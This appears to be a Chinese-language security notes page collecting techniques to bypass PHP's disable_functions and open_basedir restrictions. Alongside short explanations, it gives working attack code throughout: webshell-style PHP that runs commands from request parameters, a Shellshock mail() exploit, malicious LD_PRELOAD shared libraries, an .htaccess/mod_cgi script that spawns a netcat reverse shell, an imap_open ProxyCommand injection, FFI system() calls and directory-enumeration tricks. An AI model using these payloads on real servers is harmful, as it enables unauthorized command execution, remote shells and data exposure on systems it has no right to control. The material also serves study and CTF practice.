categories:
- web
tags:
- php
title: bypass_disable_function_open_basedir
---
# bypass disable_function



## 危险函数/类

```
FFI
COM
exec
assert
eval
system
ini_set/ini_alter
putenv
imap_open
pcntl_exec
win_shell_execute
dl
```



## 利用Windows系统组件COM绕过

利用条件：

```
extension=php_com_dotnet.dll
com.allow_dcom = true
wshom.ocx 存在
```



```php
$command = $_GET['cmd'];
$wsh = new COM('WScript.shell'); // 生成一个COM对象　Shell.Application也能
$exec = $wsh->exec("cmd /c".$command); //调用对象方法来执行命令
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
```





## GNU Bash 环境变量远程命令执行漏洞 CVE-2014-6271

>    被攻击的bash存在漏洞（版本小于等于4.3）
>    攻击者可以控制环境变量
>    新的bash进程被打开触发漏洞并执行命令

利用php的mail函数:https://www.exploit-db.com/exploits/35146 

https://www.antiy.com/response/CVE-2014-6271.html

### **漏洞原理**

4.3及之前的bash启动解析环境变量时未对边界进行严格的限制

“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。核心的原因在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断。



bash函数的格式,调用函数只需变量名+参数即可`函数 参数1 参数2`

```bash
funtion ShellShock 
{ echo "Injection"} ShellShock   #调用这个函数
```

这个时候的Bash的环境变量：

```
KEY = ShellShockVALUE = () { echo Injection; }


```

来看看ShellShock漏洞的真身：

```shell
export ShellShock='() { :; }; echo;/usr/bin/whoami'
bash>Kr0iN
```

看看环境变量你有什么
![image1229](https://i.loli.net/2019/09/11/nhgdTelRLotsjym.png)




```bash
env x='() { :;}; echo Vulnerable CVE-2014-6271 ' bash -c "echo test"
```

![image1379](https://i.loli.net/2019/09/11/nhgdTelRLotsjym.png)



### 利用方式

#### php的mail函数()

如果服务器的默认sh是bash,mail函数会生成一个bash进程,再结合putenv()利用破壳漏洞来实现任意命令执行

会生成bash进程除了mail,php函数还有imap_mail，如果你仅仅通过禁用mail函数来规避这个安全问题，那么imap_mail是可以做替代的。当然，php里还可能有其他地方有调用popen或其他能够派生bash子进程的函数，通过这些地方，都可以通过破壳漏洞执行命令的。

更详细的解释:p牛的[PHP Execute Command Bypass Disable_functions](https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html)

```php
# Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions)
# Google Dork: none
# Date: 10/31/2014
# Exploit Author: Ryan King (Starfall)
# Vendor Homepage: http://php.net
# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror
# Version: 5.* (tested on 5.6.2)
# Tested on: Debian 7 and CentOS 5 and 6
# CVE: CVE-2014-6271
<pre>
<?php echo "Disabled functions: ".ini_get('disable_functions')."\n"; ?>
<?php
function shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283
   if(strstr(readlink("/bin/sh"), "bash") != FALSE) {
     $tmp = tempnam(".","data");
     putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
     // In Safe Mode, the user may only alter environment variables whose names
     // begin with the prefixes supplied by this directive.
     // By default, users will only be able to set environment variables that
     // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive is empty,
     // PHP will let the user modify ANY environment variable!
     mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actually send any mail
   }
   else return "Not vuln (not bash)";
   $output = @file_get_contents($tmp);
   @unlink($tmp);
   if($output != "") return $output;
   else return "No output, or not vuln.";
}
echo shellshock($_REQUEST["cmd"]);
?>
```





## 利用php-fpm未授权访问漏洞

### 推荐文章

[Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)

[浅析php-fpm的攻击方式](https://xz.aliyun.com/t/5598)

### 什么是php-fpm

php-fpm是php官方的fastcgi解析器,Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。FPM按照fastcgi的协议将TCP流解析成真正的数据。

说到fastcgi,就必须先讲一下cgi

cgi的历史:

> 早期的webserver只处理html等静态文件，但是随着技术的发展，出现了像php等动态语言。
> webserver处理不了了，怎么办呢？那就交给php解释器来处理吧！
> 交给php解释器处理很好，但是，php解释器如何与webserver进行通信呢？
> 为了解决不同的语言解释器(如php、python解释器)与webserver的通信，于是出现了cgi协议。只要你按照cgi协议去编写程序，就能实现语言解释器与webwerver的通信。如php-cgi程序。

Fast-CGI:

虽然cgi解决php解释器与webserver的通信问题，但是webserver每收到一个请求就会去fork一个cgi进程,请求结束再kill掉这个进程,这样会很浪费资源,于是出现了cgi的改良版本。

> fast-cgi每次处理完请求后，不会kill掉这个进程，而是保留这个进程，使这个进程可以一次处理多个请求。这样每次就不用重新fork一个进程了，大大提高了效率。

php-fpm 是一个Fastcgi的实现,并提供进程管理功能。

进程包含了master进程和worker进程

master进程只有一个,负责监听端口(一般是9000)接收来自Web Server的请求,而worker进程则一般有多个(具体数量根据实际需要配置),每个进程内部都嵌入了一个php解释器,是php代码真正执行的地方。

[![image4092](https://xzfile.aliyuncs.com/media/upload/picture/20190709100809-65db4fc6-a1ee-1.jpg)

上面第一个是主进程,下面两个是worker进程。



### 服务器利用fastcgi的通信过程

Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。

fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。

类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。

record具有固定的结构。

```c
typedef struct {
  /* Header */
  unsigned char version; // 版本
  unsigned char type; // 本次record的类型
  unsigned char requestIdB1; // 本次record对应的请求id
  unsigned char requestIdB0;
  unsigned char contentLengthB1; // body体的大小
  unsigned char contentLengthB0;
  unsigned char paddingLength; // 额外块大小
  unsigned char reserved; 

  /* Body */
  unsigned char contentData[contentLength];
  unsigned char paddingData[paddingLength];
} FCGI_Record;
```

而其中的`type`就是指定该record的作用。因为fastcgi一个record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个record。通过`type`来标志每个record的作用，用`requestId`作为同一次请求的id。

也就是说，每次请求，会有多个record，他们的`requestId`是相同的。

借用[该文章](http://blog.csdn.net/shreck66/article/details/50355729)中的一个表格，列出最主要的几种`type`：

![image5295](https://i.loli.net/2019/09/10/4CbPDvp6XlAkWiI.png)



根据这个表格我们可以猜测，服务器中间件和后端语言通信，第一个数据包就是`type`为1的record，后续互相交流，发送`type`为4、5、6、7的record，结束时发送`type`为2、3的record。

我们要关注的重点就是type=4的部分,也就是是设置环境变量的地方。

php里有很多有趣的设置,像文件包含里常用的php设置`auto_prepared_file,auto_append_file`

我们令`auto_prepared_file=php://input`且`allow_url_include=On`

那么我们该如何利用fastcgi来设置php的环境变量

这又涉及到PHP-FPM的两个环境变量，`PHP_VALUE`和`PHP_ADMIN_VALUE`。这两个环境变量就是用来设置PHP配置项的，`PHP_VALUE`可以设置模式为`PHP_INI_USER`和`PHP_INI_ALL`的选项，`PHP_ADMIN_VALUE`可以设置所有选项。（`disable_functions`除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中）

结构体实例:

```php
array(
		'GATEWAY_INTERFACE' => 'FastCGI/1.0',
		'REQUEST_METHOD' => 'POST',
		'SCRIPT_FILENAME' => '/var/www/html/index.php',
		'SERVER_SOFTWARE' => 'php/fcgiclient',
		'REMOTE_ADDR' => '127.0.0.1',
		'REMOTE_PORT' => '9985',
		'SERVER_ADDR' => '127.0.0.1',
		'SERVER_PORT' => '80',
		'SERVER_NAME' => 'mag-tured',
		'SERVER_PROTOCOL' => 'HTTP/1.1',
		'CONTENT_TYPE' => 'application/x-www-form-urlencoded',
        'CONTENT_LENGTH' => strlen($content),
        'PHP_VALUE' =>'auto_append_file=php://input',
        'PHP_ADMIN_VALUE'=>'allow_url_include=On'
	)
```



### 原理浅析

这个原理的漏洞原因是PHP-FPM未授权访问漏洞,php-fpm没有对发送数据的来源进行验证,导致只要我们向php-fpm发送符合格式的数据就可以被解析.再结合fastcgi设置环境变量的部分来达到getshell

### fpm利用脚本

分享个p牛脚本里面的一个client客户端: [Python FastCGI Client](https://github.com/wuyunfeng/Python-FastCGI-Client)
还有Lz1y师傅给的一个php客户端 [PHP FastCGI Client](https://github.com/adoy/PHP-FastCGI-Client.git)

还要php语言客户端: [fastcgi客户端PHP语言实现](http://nullget.sourceforge.net/?q=node/795&lang=zh-hans)



## LD_PRELOAD绕过

### send_mail



这里我们先来看一下原理，首先什么是LD_PRELOAD？

google给出如下定义

```
LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.
```

即LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用

而putenv可以设置环境变量

```php
putenv ( string $setting ) : bool
```

添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。

那么我们可以进行一下骚操作

>1.制作一个恶意shared libraries
>2.使用putenv设置LD_PRELOAD为恶意文件路径
>3.使用某个php函数，触发specific shared library

#### 利用函数

`putenv,errorlog,mail`

#### 如何制作shared libraries

选择要替换的函数我们这里选取geteuid()

理由是php的mail()函数会调用系统的sendmail命令而sendmail命令会调用getuid()这个函数,所以我们确定目标为geteuid函数

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void payload() {
	system("ls > result.txt");
	}
    int  geteuid() {
    if (getenv("LD_PRELOAD") == NULL) 
    { return 0; }
    unsetenv("LD_PRELOAD");
    payload();
  	}
```

当这个共享库中的 `geteuid` 被调用时，尝试加载 `payload()` 函数，执行命令。这个测试函数写的很简单，实际应用时可相应调整完善。在攻击机上（注意编译平台应和靶机平台相近，至少不能一个是 32 位一个是 64 位）把它编译为一个位置信息无关的动态共享库：

```
gcc -c -fPIC hack.c -o hack
gcc -shared hack -o hack.so
```

#### 利用

将恶意的.so文件上传到服务器

执行如下代码,即可载入恶意命令

```php
<?php
putenv("LD_PRELOAD=/var/www/hack.so");
mail("[email protected]","","","","");
?>
```

#### 相关文章

https://www.anquanke.com/post/id/175403

https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html

[https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#8-mail-%E7%AC%AC%E4%BA%94%E4%B8%AA%E5%8F%82%E6%95%B0-excrt-cmd](https://www.k0rz3n.com/2019/02/12/PHP 中可以利用的危险的函数/#8-mail-第五个参数-excrt-cmd)

https://www.freebuf.com/articles/web/169156.html



### without sendmail

 [参考链接](https://www.mi1k7ea.com/2019/06/02/浅谈几种Bypass-disable-functions的方法/#Method2——劫持启动进程) 

>回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，那我就完全可以不依赖 sendmail 了。这种场景与 C++ 的构造函数简直神似！
>
>GCC 有个 C 语言扩展修饰符 `__attribute__((constructor))`，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 `__attribute__((constructor))` 修饰的函数。这一细节非常重要，很多朋友用 LD_PRELOAD 手法突破 disable_functions 无法做到百分百成功，正因为这个原因，**不要局限于仅劫持某一函数，而应考虑拦劫启动进程这一行为**。
>
>此外，我通过 LD_PRELOAD 劫持了启动进程的行为，劫持后又启动了另外的新进程，若不在新进程启动前取消 LD_PRELOAD，则将陷入无限循环，所以必须得删除环境变量 LD_PRELOAD。最直观的做法是调用 `unsetenv("LD_PRELOAD")`，这在大部份 linux 发行套件上的确可行，但在 centos 上却无效，究其原因，centos 自己也 hook 了 unsetenv()，在其内部启动了其他进程，根本来不及删除 LD_PRELOAD 就又被劫持，导致无限循环。所以，我得找一种比 unsetenv() 更直接的删除环境变量的方式。是它，全局变量 `extern char** environ`！实际上，unsetenv() 就是对 environ 的简单封装实现的环境变量删除功能。



#### 由于open_basedir+web目录不可写绕过

见 bypass open_basedir 的 tmpfile部分



#### 攻击利用



bypass_disablefunc.c

```
#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>


extern char** environ;

__attribute__ ((__constructor__)) void preload (void)
{
    // get command line options and arg
    const char* cmdline = getenv("EVIL_CMDLINE");

    // unset environment variable LD_PRELOAD.
    // unsetenv("LD_PRELOAD") no effect on some 
    // distribution (e.g., centos), I need crafty trick.
    int i;
    for (i = 0; environ[i]; ++i) {
            if (strstr(environ[i], "LD_PRELOAD")) {
                    environ[i][0] = '\0';
            }
    }

    // executive command
    system(cmdline);
}
```

接着用以下语句编译C文件为共享对象文件：

```
gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so
```

bypass_disablefunc.php，代码和test.php一致：

```php
<?php
    $cmd = "ls";
    $out_path = "/tmp/cmdout";
    $evil_cmdline = $cmd . " > " . $out_path . " 2>&1";
    echo "<p> <b>cmdline</b>: " . $evil_cmdline . "</p>";
    putenv("EVIL_CMDLINE=" . $evil_cmdline);
    $so_path = "/var/www/html/bypass_disablefunc.so";
    putenv("LD_PRELOAD=" . $so_path);
    mail("", "", "", "");
    echo "<p> <b>output</b>: <br />" . nl2br(file_get_contents($out_path)) . "</p>"; 
    unlink($out_path);
?>
```



## apache+php cgi mod攻击

### 原理

php作为cgi模式运行的时候，接受-s  -d -c 这样的参数，我们看看这些参数的功能

```html
-s Output HTML syntax highlighted source -d foo[=bar] Define INI entry foo with value bar
```

然后再看看攻击代码片段

```php
char poststr[] = "POST %s?%%2D%%64+%%61%%6C%%6C%%6F%%77%%5F" \ "%%75%%72%%6C%%5F%%69%%6E%%63%%6C%%75%%64%%65%%3D%%6F%%6E+%%2D%%64" \ "+%%73%%61%%66%%65%%5F%%6D%%6F%%64%%65%%3D%%6F%%66%%66+%%2D%%64+%%73" \ "%%75%%68%%6F%%73%%69%%6E%%2E%%73%%69%%6D%%75%%6C%%61%%74%%69%%6F%%6E" \ "%%3D%%6F%%6E+%%2D%%64+%%64%%69%%73%%61%%62%%6C%%65%%5F%%66%%75%%6E%%63" \ "%%74%%69%%6F%%6E%%73%%3D%%22%%22+%%2D%%64+%%6F%%70%%65%%6E%%5F%%62" \ "%%61%%73%%65%%64%%69%%72%%3D%%6E%%6F%%6E%%65+%%2D%%64+%%61%%75%%74" \ "%%6F%%5F%%70%%72%%65%%70%%65%%6E%%64%%5F%%66%%69%%6C%%65%%3D%%70%%68" \ "%%70%%3A%%2F%%2F%%69%%6E%%70%%75%%74+%%2D%%64+%%63%%67%%69%%2E%%66%%6F" \ "%%72%%63%%65%%5F%%72%%65%%64%%69%%72%%65%%63%%74%%3D%%30+%%2D%%64+%%63" \ "%%67%%69%%2E%%72%%65%%64%%69%%72%%65%%63%%74%%5F%%73%%74%%61%%74%%75%%73" \ "%%5F%%65%%6E%%76%%3D%%30+%%2D%%6E HTTP/1.1\r\n" \
```



解码出来是



```php
%s?-d allow_url_include=on -d safe_mode=off -d suhosin.simulation3Don -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input -d cgi.fo"rce_redirect=0 -d cgi.redirect_status_env=0 -n
```



这样Kingcope的攻击代码思路就出来了。

关闭各种防护的参数，打开各种危险的参数，最后利用auto_prepend_file（或auto_append_file）这个参数把黑客需要执行的系统命令传递过去了。

### 利用条件

1、apache+php是用cgi模式跑的，例如apache的mod_cgid

2、php解释器需要可以从下面的url访问到，当然或许可能是其他的url，这个具体要看你的配置

```html
	/cgi-bin/php
	/cgi-bin/php5
	/cgi-bin/php-cgi
	/cgi-bin/php.cgi
	/cgi-bin/php4
```

3、php版本
PHP版本小于5.3.12
PHP版本小于5.4.2

或者

1.  mod_cgi已经启用 
2.  必须允许.htaccess文件 , 在httpd.conf中，要注意AllowOverride选项为All 
3.  必须有权限写.htaccess文件

### 利用脚本

```php
<?php
$cmd = "nc -c'/bin/bash' 127.0.0.1 4444"; //反弹一个shell出来，这里用本地的4444端口
$shellfile ="#!/bin/bash\n"; //指定shell
$shellfile .="echo -ne \"Content-Type: text/html\\n\\n\"\n"; //需要指定这个header，否则会返回500
$shellfile .="$cmd"; 
functioncheckEnabled($text,$condition,$yes,$no) //this surely can be shorter
{
    echo "$text: " . ($condition ?$yes : $no) . "<br>\n";
}
if(!isset($_GET['checked']))
{
    @file_put_contents('.htaccess',"\nSetEnv HTACCESS on", FILE_APPEND); 
    header('Location: ' . $_SERVER['PHP_SELF']. '?checked=true'); //执行环境的检查
}
else
{
    $modcgi = in_array('mod_cgi',apache_get_modules()); // 检测mod_cgi是否开启
    $writable = is_writable('.'); //检测当前目录是否可写
    $htaccess = !empty($_SERVER['HTACCESS']);//检测是否启用了.htaccess
        checkEnabled("Mod-Cgienabled",$modcgi,"Yes","No");
        checkEnabled("Iswritable",$writable,"Yes","No");
        checkEnabled("htaccessworking",$htaccess,"Yes","No");
    if(!($modcgi && $writable&& $htaccess))
    {
        echo "Error. All of the above mustbe true for the script to work!"; //必须满足所有条件
    }
    else
    {
       
 checkEnabled("Backing 
up.htaccess",copy(".htaccess",".htaccess.bak"),"Suceeded!Saved in 
.htaccess.bak","Failed!"); //备份一下原有.htaccess
        
checkEnabled("Write 
.htaccessfile",file_put_contents('.htaccess',"Options 
+ExecCGI\nAddHandlercgi-script 
.dizzle"),"Succeeded!","Failed!");//.dizzle，我们的特定扩展名
        checkEnabled("Write shellfile",file_put_contents('shell.dizzle',$shellfile),"Succeeded!","Failed!");//写入文件
        checkEnabled("Chmod777",chmod("shell.dizzle",0777),"Succeeded!","Failed!");//给权限
        echo "Executing the script now.Check your listener <img src = 'shell.dizzle' style ='display:none;'>"; //调用
    }
}
?>
```



## imap_open

>PHP 的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。利用此漏洞的功能代码是Metasploit Framework的一部分。 

### 利用条件

存在ssh和rsh功能 且  enable_insecure_rsh = true

### 利用脚本(未测试)

```php
if (!function_exists('imap_open')) {
        die("no imap_open function!");
}
$server = "x -oProxyCommand=echo\t" . base64_encode($_GET['cmd'] . ">/tmp/cmd_result") . "|base64\t-d|sh}";
//$server = 'x -oProxyCommand=echo$IFS$()' . base64_encode($_GET['cmd'] . ">/tmp/cmd_result") . '|base64$IFS$()-d|sh}';
imap_open('{' . $server . ':143/imap}INBOX', '', ''); // or var_dump("\n\nError: ".imap_last_error());
sleep(5);
echo file_get_contents("/tmp/cmd_result");
```



## 利用pcntl插件绕过

```
pcntl_exec("/bin/bash", array("/tmp/b4dboy.sh"));
```



## FFI

### 特性

FFI::load 无视 opeb_basedir 可以直接加载文件

FFI 相对于 php 更加底层，可以泄露内存

### 命令执行

```php
$ffi=FFI::cdef("int system(char *command);","libc.so.6");
$ffi->system("sleep 5");
```

### open_basedir，禁用FFI::cdef，目录无法写文件命令执行

```
$value=<<<EOF
#define FFI_SCOPE "DUMMY"
#define FFI_LIB "libc.so.6"
 
int system(const char *command);
EOF;

$tmpHandle = tmpfile();
$metaDatas = stream_get_meta_data($tmpHandle);
$tmpFilename = $metaDatas['uri'];
fwrite($tmpHandle, $value);
fseek($tmpHandle, 0);
echo fread($tmpHandle, 1024);
var_dump($tmpFilename);
fflush($tmpHandle );


$ffi=FFI::load($tmpFilename);
$ffi->system('echo bypass_disable_function > /tmp/testing');

fclose($tmpHandle);
```



### 内存泄露



```php
$c=FFI::load("/flag.h");
$b=FFI::cast("void *",FFI::new("int[1]",false));
$a=FFI::string($b-400000,400000);
var_dump($a);

```



##  php-json-bypass



https://github.com/mm0r1/exploits/tree/master/php-json-bypass



##  **php7-backtrace-bypass** 

 https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass 



##  **php7-gc-bypass** 

 https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass 



## win_shell_execute

```php
if (!extension_loaded("win32std")) die("win32std extension required!");
system("cmd.exe"); //just to be sure that protections work well
win_shell_execute("..\\..\\..\\..\\windows\\system32\\cmd.exe");

```



## ImageMagick





## 推荐网址

https://www.freebuf.com/articles/web/169156.html







## 参考文章

 https://www.anquanke.com/post/id/197745#h3-5 

 [浅谈几种Bypass-disable-functions的方法](https://www.mi1k7ea.com/2019/06/02/浅谈几种Bypass-disable-functions的方法) 




# bypass  open_basedir

## tmpfile绕过open_basedir在/tmp目录写文件

```
<?php
$value=<<<EOF

EOF;

$tmpHandle = tmpfile();
$metaDatas = stream_get_meta_data($tmpHandle);
$tmpFilename = $metaDatas['uri'];
fwrite($tmpHandle, $value);
fseek($tmpHandle, 0);
echo fread($tmpHandle, 1024);
var_dump($tmpFilename);
fflush($tmpHandle );



fclose($tmpHandle);
```







## ini_set与chdir 绕过open_basedir

```php
mkdir('img');
chdir('img');
ini_set('open_basedir','..');
chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');chdir('..');
ini_set('open_basedir','/');

```



## glob协议列根目录

```php
$it = new DirectoryIterator("glob:///*");
foreach ($it as $f){
    echo $f->__toString()." ";
}

```

## realpath列目录

realpath是php中一个将相对路径转化为绝对路径的方法，而如果开启了`open_basedir`的话，如果我们传入一个不存在的文件名，会返回false，但是如果我们传入一个不在`open_basedir`里的文件的话，他就会返回`file is not within the allowed path(s)`，所以这个时候就可以类似于报错盲注去爆出文件名了
这里有个小trick，利用windows下的通配符<和>去进行爆破可以快一点

```php
<?php
ini_set('open_basedir',dirname(__FILE__));
printf("open_basedir: %s<br/><br/>", ini_get('open_basedir'));
set_error_handler('isexist');
$dir = 'd:/test/';
$file = '';
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789-*/+_';
for ($i=0; $i<strlen($chars); $i++){
    $file = $dir.$chars[$i].'<<';
    realpath($file);
}
function isexist($errno, $errstr){
    $regex = '/File\((.*)\) is not within/';
    printf("errstr: %s <br/>",$errstr);
    preg_match($regex, $errstr, $mathes);
    if (isset($mathes[1])){
        printf("%s <br/><br/>", $mathes[1]);
    }
}
```



## SplFileInfo::getRealPath列目录

 SplFileInfo类是一个用来为单个文件的信息提供高级的面向对象的接口，这个类可以进行很多文件的方法，其中就有一个方法和之前的`realpath`很相似，就是`getRealPath`，这个方法在获取文件路径的时候，如果存入一个不存在的路径时，会返回false，否则返回绝对路径，而且他还直接忽略了`open_basedir`的设定 

```php
<?php
ini_set('open_basedir', dirname(__FILE__));
printf("open_basedir: %s <br/><br/>", ini_get('open_basedir'));
$basedir = 'd:/test/';
$arr = array();
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
for ($i=0; $i < strlen($chars); $i++) {
    $info = new SplFileInfo($basedir . $chars[$i] . '<<');
    $re = $info->getRealPath();
    if ($re) {
        echo $re."<br>";
    }
}
```



## GD库imageftbbox/imagefttext列举目录

```php
<?php
ini_set('open_basedir', dirname(__FILE__));
printf("<b>open_basedir: %s</b><br />", ini_get('open_basedir'));
set_error_handler('isexists');
$dir = 'd:/test/';
$file = '';
$chars = 'abcdefghijklmnopqrstuvwxyz0123456789_';
for ($i=0; $i < strlen($chars); $i++) { 
    $file = $dir . $chars[$i] . '<><';
    //$m = imagecreatefrompng("zip.png");
    //imagefttext($m, 100, 0, 10, 20, 0xffffff, $file, 'aaa');
    imageftbbox(100, 100, $file, 'aaa');
}
function isexists($errno, $errstr)
{
    global $file;
    if (stripos($errstr, 'Invalid font filename') === FALSE) {
        printf("%s<br/>", $file);
    }
}
?>
```



## bindtextdomain暴力猜解目录

![image19658](https://raw.githubusercontent.com/Explorersss/photo/master/20200630132038.png)

 如上图，这个函数第二个参数`$directory`是一个文件路径。它会在`$directory`存在的时候返回`$directory`，不存在则返回false。 



## 参考

 https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html 



 https://xi4or0uji.github.io/2019/05/15/open_basedir-bypass/#bindtextdomain 